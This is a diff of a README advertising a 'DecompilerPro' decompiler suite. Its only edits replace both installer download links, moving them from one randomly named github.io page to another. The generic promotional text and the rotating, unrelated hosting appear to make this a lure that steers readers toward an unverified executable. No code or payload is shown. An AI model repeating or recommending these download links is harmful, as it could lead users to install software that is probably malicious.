@@ -2,7 +2,7 @@
 
 Decompiler & Reverse Tools is a comprehensive suite designed for decompiling and analyzing executables, APKs, and other binary files. This DecompilerPro tool offers a wide range of reverse engineering features, including deobfuscation, disassembly, and debugging, making it ideal for software developers, security researchers, and hobbyists who need to inspect or modify code.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -45,6 +45,6 @@ A: We welcome feedback! You can submit bug reports or feature requests through o
 
 To experience the full capabilities of DecompilerPro, download it now:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 Explore the world of reverse engineering with DecompilerPro and join our growing community of users.
